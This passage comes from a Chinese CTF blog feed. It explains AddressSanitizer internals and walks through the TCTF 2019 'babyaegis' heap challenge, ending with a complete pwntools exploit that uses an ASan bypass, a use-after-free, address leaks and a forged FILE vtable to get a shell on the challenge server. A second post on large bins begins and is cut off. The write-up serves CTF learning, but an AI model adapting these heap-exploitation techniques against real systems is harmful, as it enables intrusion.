<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">byte *shadow_address = MemToShadow(address);</span><br><span class="line">byte shadow_value = *shadow_address;</span><br><span class="line"><span class="keyword">if</span> (shadow_value) &#123;</span><br><span class="line">  <span class="keyword">if</span> (SlowPathCheck(shadow_value, address, kAccessSize)) &#123;</span><br><span class="line">    ReportError(address, kAccessSize, kIsWrite);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the cases where we access first k bytes of the qword</span></span><br><span class="line"><span class="comment">// and these k bytes are unpoisoned.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SlowPathCheck</span><span class="params">(shadow_value, address, kAccessSize)</span> </span>&#123;</span><br><span class="line">  last_accessed_byte = (address &amp; <span class="number">7</span>) + kAccessSize - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (last_accessed_byte &gt;= shadow_value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断连续8字节是否可用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*a = <span class="literal">NULL</span>; <span class="comment">// give a something... or b = *a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *shadow = (a &gt;&gt; <span class="number">3</span>) + Offset;</span><br><span class="line"><span class="keyword">if</span> (*shadow) &#123;</span><br><span class="line">	ReportError(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>N字节是否可用（N=1, 2, 4）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *shadow = (a &gt;&gt; <span class="number">3</span>) + Offset;</span><br><span class="line"><span class="keyword">if</span> ( *shadow &amp;&amp;</span><br><span class="line">     *shadow &lt;= ( (a &amp; <span class="number">7</span>) + N - <span class="number">1</span>) ) &#123;</span><br><span class="line">	ReportError(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ASan还具有一个特性，被释放的块不会马上被重复使用，有一个默认阈值256MB，当再被释放256MB的内存空间之后，之前被释放的内存才会被重用。</p>
<blockquote>
<p>A use-after-free may not be detected if a large amount of memory has been allocated and deallocated between the “free“ and the following use.</p>
<p>Quarantine size (default: 256MB). This value controls the ability to find heap-use-after-free bugs (see Section 3.5). It does not affect performance</p>
</blockquote>
<p>ASan中堆块的header：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkHeader</span> &#123;</span></span><br><span class="line">  <span class="comment">// 1-st 8 bytes.</span></span><br><span class="line">  u32 chunk_state       : <span class="number">8</span>;  <span class="comment">// Must be first.</span></span><br><span class="line">  u32 alloc_tid         : <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">  u32 free_tid          : <span class="number">24</span>;</span><br><span class="line">  u32 from_memalign     : <span class="number">1</span>;</span><br><span class="line">  u32 alloc_type        : <span class="number">2</span>;</span><br><span class="line">  u32 rz_log            : <span class="number">3</span>;</span><br><span class="line">  u32 lsan_tag          : <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// 2-nd 8 bytes</span></span><br><span class="line">  <span class="comment">// This field is used for small sizes. For large sizes it is equal to</span></span><br><span class="line">  <span class="comment">// SizeClassMap::kMaxSize and the actual size is stored in the</span></span><br><span class="line">  <span class="comment">// SecondaryAllocator&#x27;s metadata.</span></span><br><span class="line">  u32 user_requested_size : <span class="number">29</span>;</span><br><span class="line">  <span class="comment">// align &lt; 8 -&gt; 0</span></span><br><span class="line">  <span class="comment">// else      -&gt; log2(min(align, 512)) - 2</span></span><br><span class="line">  u32 user_requested_alignment_log : <span class="number">3</span>;</span><br><span class="line">  u32 alloc_context_id;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="0x01-babyaegis"><a href="#0x01-babyaegis" class="headerlink" title="0x01 babyaegis"></a>0x01 babyaegis</h4><p>首先是<code>secret()</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( secret_enable )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>((__asan *)<span class="string">&quot;Lucky Number: &quot;</span>);</span><br><span class="line">    v2 = read_ul();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;&gt; <span class="number">44</span> )</span><br><span class="line">      v0 = (_BYTE *)(v2 | <span class="number">0x700000000000</span>LL);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v0 = (_BYTE *)v2;</span><br><span class="line">    *v0 = <span class="number">0</span>;</span><br><span class="line">    secret_enable = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No secret!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以往大于0x700000000000的地址处任意写一次’\x00’。另外在<code>add_note()</code>函数中，会使得<code>ID</code>和<code>content</code>相连接上，导致<code>update_note()</code>中的<code>strlen()</code>后存在堆溢出。在<code>delete_note()</code>中还存在<em>USE-AFTER-FREE</em>。</p>
<p>由于存在溢出，首先需要做的就是欺骗ASan使得我们可以溢出到下一个chunk的header。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(p, <span class="number">0x10</span>, <span class="string">&#x27;sunichi!&#x27;</span>, <span class="number">0x00ffffffffffffff</span>)</span><br><span class="line">update(p, <span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="number">0xffffffffffffff</span>)</span><br><span class="line">secret(p, <span class="number">0x0c047fff8000</span>+<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>相关标记信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow (/pwn/tctf2019/online/aegis/aegis/aegis+0x983ab)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">=&gt;0x0c047fff8000: fa fa 00 00[fa]fa 00 00 fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07</span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="built_in">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      <span class="built_in">fc</span></span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">==126==ABORTING</span><br></pre></td></tr></table></figure>

<p>在尝试的过程中发现，相关ASan代码只检查了数据写入的起始点是否可写，后续同一次操作则不会继续检查。在使用<code>secret</code>修改之前，我们可以看到0x0c047fff8000处开始的8字节是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0xc047fff8000:  0xfa    0xfa    0x00    0x00    0xfa    0xfa    0x00    0x00</span><br></pre></td></tr></table></figure>

<p>如果0x0c047fff8004处的0xfa未被修改的话，我们将无法继续溢出。因此在这使用<code>secret()</code>对0x0c047fff8004进行修改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0xc047fff8000:  0xfa    0xfa    0x00    0x00    0x00    0xfa    0x00    0x00</span><br></pre></td></tr></table></figure>

<p>接着就可以通过溢出修改下一个chunk的header了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;\x02&#x27;</span> + <span class="string">&#x27;\xff&#x27;</span> * <span class="number">2</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">update(p, <span class="number">0</span>, content , <span class="number">0x1000000002ffffff</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Old header : </span><br><span class="line">0x602000000020: 0x02ff00ffffffffff      0x7000000120000010</span><br><span class="line">New header : </span><br><span class="line">0x602000000020: 0x02ffffff00ffff02      0x7000000110000000</span><br><span class="line">Previous 0x10 chunk header before free:</span><br><span class="line">0x602000000000: 0x02ffffff00000002      0x4e80000120000010</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ChunkHeader</span> &#123;</span></span><br><span class="line">  <span class="comment">// 1-st 8 bytes.</span></span><br><span class="line">  u32 chunk_state       : <span class="number">8</span>;  <span class="comment">// Must be first. // 1 byte</span></span><br><span class="line">  u32 alloc_tid         : <span class="number">24</span>;                   <span class="comment">// 3 byte</span></span><br><span class="line"></span><br><span class="line">  u32 free_tid          : <span class="number">24</span>;                   <span class="comment">// 3 byte</span></span><br><span class="line">  u32 from_memalign     : <span class="number">1</span>;                    <span class="comment">// Total: 1 byte</span></span><br><span class="line">  u32 alloc_type        : <span class="number">2</span>;</span><br><span class="line">  u32 rz_log            : <span class="number">3</span>;</span><br><span class="line">  u32 lsan_tag          : <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// 2-nd 8 bytes</span></span><br><span class="line">  <span class="comment">// This field is used for small sizes. For large sizes it is equal to</span></span><br><span class="line">  <span class="comment">// SizeClassMap::kMaxSize and the actual size is stored in the</span></span><br><span class="line">  <span class="comment">// SecondaryAllocator&#x27;s metadata.</span></span><br><span class="line">  u32 user_requested_size : <span class="number">29</span>;                  <span class="comment">// 3 byte - 3 bit</span></span><br><span class="line">  <span class="comment">// align &lt; 8 -&gt; 0</span></span><br><span class="line">  <span class="comment">// else      -&gt; log2(min(align, 512)) - 2</span></span><br><span class="line">  u32 user_requested_alignment_log : <span class="number">3</span>;</span><br><span class="line">  u32 alloc_context_id;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>通过了解ASan chunk的结构，我们将下一个chunk也就是NOTE的NODE所在的chunk设置大小为0x10000000。释放NOTE[0]（<strong>注意</strong>：这里释放0x10000000大小的块是为了满足ASan重用chunk的条件），并重新申请chunk和伪造NODE以后续<em>USE-AFTER-FREE</em>的利用，通过<code>show_note()</code>泄漏elf基地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(p, <span class="number">0</span>)</span><br><span class="line">add(p, <span class="number">0x10</span>, p64(<span class="number">0x602000000010</span>+<span class="number">8</span>)[:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">show(p, <span class="number">0</span>)    </span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">recv = p.recv(<span class="number">6</span>)</span><br><span class="line">cfi_check = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">elf.address = cfi_check - <span class="number">0x114ab0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x55c729db3cc0: 0x0000602000000030      0x0000602000000010</span><br><span class="line"></span><br><span class="line">0x602000000000: 0x02ffffff00000002      0x6d80000220000010</span><br><span class="line">0x602000000010: 0x0000602000000030      0x0000556f318b7ab0</span><br><span class="line">0x602000000020: 0x02ffffff00000002      0x4280000120000010</span><br><span class="line">0x602000000030: 0x0000602000000018      0x0000000000000000</span><br><span class="line">0x602000000040: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>利用<code>alarm@got</code>泄漏<em>glibc</em>地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update(p, <span class="number">1</span>, <span class="string">&#x27;aa&#x27;</span>, <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">update(p, <span class="number">1</span>, p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])[:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>, cfi_check)</span><br><span class="line">show(p, <span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">recv = p.recv(<span class="number">6</span>)</span><br><span class="line">libc.address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;alarm&#x27;</span>]   </span><br></pre></td></tr></table></figure>

<p>利用<code>__environ</code>泄漏栈地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update(p, <span class="number">1</span>, p64(libc.symbols[<span class="string">&#x27;__environ&#x27;</span>])[:<span class="number">6</span>] + <span class="string">&#x27;\n&#x27;</span>, cfi_check &lt;&lt; <span class="number">8</span>)</span><br><span class="line">show(p, <span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">recv = p.recv(<span class="number">6</span>)</span><br><span class="line">stack_address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">ret_addr = stack_address - (<span class="number">0x7ffcb0855158</span> - <span class="number">0x7ffcb0855008</span>)</span><br></pre></td></tr></table></figure>

<p>获取指向<code>stdout@glibc</code>的指针：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update(p, <span class="number">1</span>, p64(libc.symbols[<span class="string">&#x27;stdout&#x27;</span>])[:<span class="number">6</span>] + <span class="string">&#x27;\n&#x27;</span>, (cfi_check) &lt;&lt; <span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>构造2.27下<code>FILE(IO_jumps)</code>的利用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vtable = libc.address + <span class="number">0x3E7FB0</span> - <span class="number">0x10</span> - <span class="number">8</span> * <span class="number">5</span></span><br><span class="line">payload = p64(<span class="number">0x00000000fbad2800</span>) + p64(libc.address + (<span class="number">0x00007f2e60b337e3</span> - <span class="number">0x7f2e60747000</span>)) * <span class="number">6</span> + p64(next(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))) + p64(libc.address + (<span class="number">0x00007f2e60b337e4</span> - <span class="number">0x7f2e60747000</span>))</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span> + p64(libc.address + (<span class="number">0x00007f2e60b32a00</span> - <span class="number">0x7f2e60747000</span>)) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>) + p64(libc.address + (<span class="number">0x00007f2e60b348c0</span> - <span class="number">0x7f2e60747000</span>))</span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>)+ p64(libc.address + (<span class="number">0x00007f2e60b328c0</span> - <span class="number">0x7f2e60747000</span>))</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(vtable) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">add(p, <span class="number">0x100</span>, payload, <span class="number">17</span>)</span><br></pre></td></tr></table></figure>

<p>修改<code>stdout@glibc</code>的数据为上述payload的位置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(<span class="number">0</span>))</span><br><span class="line">content = p64(<span class="number">0x611000000040</span>)[:<span class="number">6</span>] + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br></pre></td></tr></table></figure>

<p>接着触发输出拿到shell。</p>
<p>完整的exploit：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size, content, id</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;ID: &#x27;</span>, str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>(<span class="params">p, address</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, str(<span class="number">666</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, str(address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">p, idx, content, id</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;ID: &#x27;</span>, str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./aegis&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;111.186.63.209&#x27;</span>, <span class="number">6666</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./aegis&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    context.aslr = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add(p, <span class="number">0x10</span>, <span class="string">&#x27;sunichi!&#x27;</span>, <span class="number">0x00ffffffffffffff</span>)</span><br><span class="line">    update(p, <span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">15</span>, <span class="number">0xffffffffffffff</span>)</span><br><span class="line">    secret(p, <span class="number">0x0c047fff8000</span>+<span class="number">4</span>)</span><br><span class="line">    content = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;\x02&#x27;</span> + <span class="string">&#x27;\xff&#x27;</span> * <span class="number">2</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    update(p, <span class="number">0</span>, content , <span class="number">0x1000000002ffffff</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x10</span>, p64(<span class="number">0x602000000010</span>+<span class="number">8</span>)[:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    show(p, <span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>)</span><br><span class="line">    cfi_check = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">    elf.address = cfi_check - <span class="number">0x114ab0</span></span><br><span class="line"></span><br><span class="line">    update(p, <span class="number">1</span>, <span class="string">&#x27;aa&#x27;</span>, <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">    update(p, <span class="number">1</span>, p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])[:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>, cfi_check)</span><br><span class="line">    show(p, <span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>)</span><br><span class="line">    libc.address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;alarm&#x27;</span>]    </span><br><span class="line"></span><br><span class="line">    update(p, <span class="number">1</span>, p64(libc.symbols[<span class="string">&#x27;__environ&#x27;</span>])[:<span class="number">6</span>] + <span class="string">&#x27;\n&#x27;</span>, cfi_check &lt;&lt; <span class="number">8</span>)</span><br><span class="line">    show(p, <span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>)</span><br><span class="line">    stack_address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">    ret_addr = stack_address - (<span class="number">0x7ffcb0855158</span> - <span class="number">0x7ffcb0855008</span>)</span><br><span class="line"></span><br><span class="line">    update(p, <span class="number">1</span>, p64(libc.symbols[<span class="string">&#x27;stdout&#x27;</span>])[:<span class="number">6</span>] + <span class="string">&#x27;\n&#x27;</span>, (cfi_check) &lt;&lt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(stack_address)</span><br><span class="line">    <span class="keyword">print</span> hex(elf.address)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    </span><br><span class="line">    vtable = libc.address + <span class="number">0x3E7FB0</span> - <span class="number">0x10</span> - <span class="number">8</span> * <span class="number">5</span></span><br><span class="line">    payload = p64(<span class="number">0x00000000fbad2800</span>) + p64(libc.address + (<span class="number">0x00007f2e60b337e3</span> - <span class="number">0x7f2e60747000</span>)) * <span class="number">6</span> + p64(next(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))) + p64(libc.address + (<span class="number">0x00007f2e60b337e4</span> - <span class="number">0x7f2e60747000</span>))</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">4</span> + p64(libc.address + (<span class="number">0x00007f2e60b32a00</span> - <span class="number">0x7f2e60747000</span>)) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>) + p64(libc.address + (<span class="number">0x00007f2e60b348c0</span> - <span class="number">0x7f2e60747000</span>))</span><br><span class="line">    payload += p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>)+ p64(libc.address + (<span class="number">0x00007f2e60b328c0</span> - <span class="number">0x7f2e60747000</span>))</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(vtable) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    add(p, <span class="number">0x100</span>, payload, <span class="number">17</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    content = p64(<span class="number">0x611000000040</span>)[:<span class="number">6</span>] + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
        <tag>asan</tag>
      </tags>
  </entry>
  <entry>
    <title>Learn Large Bin With 0ctf2018 Heapstorm2</title>
    <url>/2019/03/11/Learn-LargeBin-With-Heapstorm2/</url>
    <content><![CDATA[<h4 id="Large-Bin基本结构"><a href="#Large-Bin基本结构" class="headerlink" title="Large Bin基本结构"></a>Large Bin基本结构</h4><p>Large Bin的每个Bin中的chunk的大小都属于同一范围，Large Bin的每个chunk位于两个双向链表中。相比较其它chunk，Large Bin中的chunk多出了<code>fd_nextsize</code>和<code>bk_nextsize</code>两个字段，分别指向前一个/后一个与当前chunk大小相邻的不同大小的第一个空闲块（不包括bin头指针）。</p>
<a id="more"></a>

<h4 id="Put-Unsorted-Bin-into-Large-Bin"><a href="#Put-Unsorted-Bin-into-Large-Bin" class="headerlink" title="Put Unsorted Bin into Large Bin"></a>Put Unsorted Bin into Large Bin</h4><p>在<code>malloc</code>时，如果Unsorted Bin中的victim的大小无法满足申请所需且属于Large Bin，将会被置入Large Bin中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim_index = largebin_index(size); <span class="comment">// 计算bin数组下标</span></span><br><span class="line">bck = bin_at(av, victim_index);      <span class="comment">// 获取bin</span></span><br><span class="line">fwd = bck-&gt;fd;                       <span class="comment">// bin中第一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">    <span class="comment">// 更新大小排序链表</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt; bck-&gt;bk-&gt;size) &#123;      <span class="comment">// 如果大小小于bin中最小的chunk大小</span></span><br><span class="line">        fwd = bck;                   <span class="comment">// 此时fwd指向bin，bin-&gt;fd == bin-&gt;bk == 唯一一个chunk</span></span><br><span class="line">        bck = bck-&gt;bk;               <span class="comment">// 此时bck指向唯一一个large bin chunk</span></span><br><span class="line">        <span class="comment">// 在bin和bck中插入</span></span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;               <span class="comment">// 写入fd_nextsize</span></span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;  <span class="comment">// 写入bk_nextsize</span></span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize; <span class="comment">// 更新fwd-&gt;fd的bk_nextsize</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin(av, 